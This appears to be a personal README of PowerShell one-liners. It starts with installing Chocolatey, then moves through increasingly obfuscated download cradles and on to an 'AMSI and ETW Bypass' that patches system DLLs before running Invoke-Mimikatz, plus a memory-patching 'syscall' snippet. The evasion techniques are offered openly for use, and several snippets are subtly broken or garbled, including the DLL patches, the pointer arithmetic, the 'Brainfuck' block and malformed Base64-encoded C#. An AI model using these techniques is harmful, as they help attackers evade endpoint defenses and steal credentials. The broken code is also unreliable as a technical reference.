# Calvin_Windows_Shortcuts
Windows shortcuts and one liners


## Install Chocolately package manager as pwsh1liner
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
```


## Install Chocolatey again
```powershell
$u='https://chocolatey.org/install.ps1';$o='install.ps1';$w=([text.encoding]::ASCII).GetString([Convert]::FromBase64String('V2ViQ2xpZW50'));$m=([text.encoding]::ASCII).GetString([Convert]::FromBase64String('RG93bmxvYWRGaWxl'));$c=[type]('System.Net.'+$w);$i=$c::new();$i.$m.Invoke($i, ($u, $o))
```


## This script uses the following obfuscation techniques:

Encode the method and property names as arrays of character codes.  
Use script blocks and invoke them with the call operator (&).  
Combine Base64-encoded class names with ASCII encoding, as in the previous example.  
  
```powershell
[char[]]$e=@(68,111,119,110,108,111,97,100,70,105,108,101);[char[]]$u=@(85,114,105);$r={param($x) return [char[]]$x -join ''};$w=([text.encoding]::ASCII).GetString([Convert]::FromBase64String('V2ViQ2xpZW50'));$c=[type]('System.Net.'+$w);$i=$c::new();& ($r.Invoke($e)) $i (&($r.Invoke($u)) 'https://chocolatey.org/install.ps1') 'install.ps1'
```


### Using aliases and a script block with a randomly generated name:  
```powershell
$alias = @{dl = 'Invoke-WebRequest'; u = 'Uri'; o = 'OutFile'}
$randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
${function:$randomName} = {
    param($url, $file)
    & $alias.dl -Uri $url -OutFile $file
}
& $randomName 'https://chocolatey.org/install.ps1' 'install.ps1'
```

### Downloading the file in chunks and reassembling it:
```powershell
$url = 'https://chocolatey.org/install.ps1'
$outputFile = 'install.ps1'
$webClient = New-Object System.Net.WebClient
$response = $webClient.GetResponse()
$totalSize = [long]$response.ContentLength
$response.Close()
$chunkSize = 1024
$chunks = [Math]::Ceiling($totalSize / $chunkSize)
$stream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
for ($i = 0; $i -lt $chunks; $i++) {
    $start = $i * $chunkSize
    $end = $start + $chunkSize - 1
    if ($end -gt $totalSize - 1) { $end = $totalSize - 1 }
    $webClient.Headers['Range'] = "bytes=$start-$end"
    $buffer = $webClient.DownloadData($url)
    $stream.Write($buffer, 0, $buffer.Length)
}
$stream.Close()
```

### CSharp stufff
```powershell
$sourceCode = @"
using System;
using System.IO;
using System.Net;

public class FileDownloader
{
    public static void DownloadFile(string url, string outputFile)
    {
        using (WebClient webClient = new WebClient())
        {
            webClient.DownloadFile(url, outputFile);
        }
    }
}
"@

Add-Type -TypeDefinition $sourceCode -Language CSharp

$url = 'https://chocolatey.org/install.ps1'
$outputFile = 'install.ps1'
[FileDownloader]::DownloadFile($url, $outputFile)
```

### CSharpd
```powershell
$base64EncodedSourceCode = @"
dXNpbmcgU3lzdGVtOwppbXBvcnQgU3lzdGVtLklPLwp1c2luZyBTeXN0ZW0uTmV0OwoKcHVibGljIGNsYXNzIEZpbGVEb3dubG9hZGVyCnsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBEb3dubG9hZEZpbGUoc3RyaW5nIHVybCwgc3RyaW5nIG91dHB1dEZpbGUpCiAgICB7CiAgICAgICAgdXNpbmcgKFdlYkNsaWVudCB3ZWJDbGllbnQgPSBuZXcgV2ViQ2xpZW50KCkpCiAgICAgICAgewogICAgICAgICAgICB3ZWJDbGllbnQuRG93bmxvYWRGaWxlKHVybCwgb3V0cHV0RmlsZSk7CiAgICAgICAgfQogICAgfQp9Cg==
"@

$sourceCode = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($base64EncodedSourceCode))
Add-Type -TypeDefinition $sourceCode -Language CSharp

$url = 'https://chocolatey.org/install.ps1'
$outputFile = 'install.ps1'
[FileDownloader]::DownloadFile($url, $outputFile)

```


### Brainfuck
```powerwshell
&{param($x)${function:l}=-join (65..90+97..122|%{[char]$_}|Get-Random -Count $x)};${function:($(l 4))}=&{param($u,$f)${function:($(l 6))}=&{param($x)return[char[]]$x-join''};${function:($(l 6))}=','+[char]39+${function:($(l 6))}(68,111,119,110,108,111,97,100,70,105,108,101)+[char]39+'('+$u+','+$f+')';${function:($(l 6))}=([text.encoding]::ASCII).GetString([Convert]::FromBase64String('V2ViQ2xpZW50'))+$(l 2);${function:($(l 6))}='['+$(l 1)+']('+$(l 6)+')';${function:($(l 6))}=(([char]96)+'c='+[type]('System.Net.'+${function:($(l 6))})).FullName);${function:($(l 6))}=$($(l 1)+[char]58+${function:($(l 6))})::new();${function:($(l 6))}.Invoke(${function:($(l 6))},(${function:($(l 6))}($u,$f)))};&($(l 4)) 'https://chocolatey.org/install.ps1' 'install.ps1'

```


### direct syscalls by importing an assembly . Built assembly. replace the first 5 bytes of NtReadVirtualMemory
```powershell
# Import the assembly
[Reflection.Assembly]::LoadFile("C:\Path\To\Assembly.dll")

# Replace the first 5 bytes of NtReadVirtualMemory
[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::ASCII.GetBytes("\x90\x90\x90\x90\x90"), 0, [System.IntPtr]::Add([System.IntPtr]::Zero, [System.IntPtr]::Size * 0x7FFE0030), 5)
```

### Something also syscall
```powershell
Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Process")

$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "cmd.exe"
$process.StartInfo.Arguments = "/c dir"
$process.StartInfo.UseShellExecute = $false
$process.StartInfo.RedirectStandardOutput = $true
$process.Start()
$output = $process.StandardOutput.ReadToEnd()
$process.WaitForExit()
Write-Host $output
```


# AMSI and ETW Bypass , tested using the forbidden string 'Invoke-Mimiktaz'
```powershell
 # AMSI and ETW Bypass

$AmsiBypass = {
  $AmsiDllPath = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name 'windir').'windir' + '\System32\amsi.dll'
  $AmsiDll = [System.IO.File]::ReadAllBytes($AmsiDllPath)
  $AmsiDll[0xB4] = 0xB0
  [System.IO.File]::WriteAllBytes($AmsiDllPath, $AmsiDll)
  }

$EtwBypass = {
  $EtwDllPath = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name 'windir').'windir' + '\System32\etwcls.dll'
  $EtwDll = [System.IO.File]::ReadAllBytes($EtwDllPath)
  $EtwDll[0xB4] = 0xB0
  [System.IO.File]::WriteAllBytes($EtwDllPath, $EtwDll)
  }
Invoke-Command -ScriptBlock $AmsiBypass
Invoke-Command -ScriptBlock $EtwBypass
# Test Forbidden String
Invoke-Mimikatz
```
